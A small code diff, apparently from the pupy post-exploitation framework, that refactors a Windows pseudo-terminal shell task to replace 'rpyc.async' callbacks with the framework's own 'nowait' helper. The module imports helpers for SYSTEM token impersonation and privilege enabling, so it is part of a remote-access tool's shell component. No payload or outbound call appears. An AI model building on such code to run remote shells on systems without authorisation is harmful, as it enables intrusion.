@@ -2,8 +2,6 @@
 
 __all__ = ['acquire', 'release']
 
-import rpyc
-
 try:
     from conpty import ConPTY as PTY
 except ImportError:
@@ -11,12 +9,14 @@ except ImportError:
 
 from collections import deque
 from pupy import manager, Task
+from network.lib.pupyrpc import nowait
 
 from pupwinutils.security import (
     sidbyname, getSidToken, get_thread_token,
     token_impersonated_as_system, EnablePrivilege,
     CloseHandle
 )
+
 
 class PtyShell(Task):
     __slots__ = (
@@ -52,8 +52,8 @@ class PtyShell(Task):
 
     def attach(self, read_cb, close_cb):
         if self.active:
-            self.read_cb = rpyc.async(read_cb)
-            self.close_cb = rpyc.async(close_cb)
+            self.read_cb = nowait(read_cb)
+            self.close_cb = nowait(close_cb)
 
             if self._buffer:
                 for item in self._buffer:
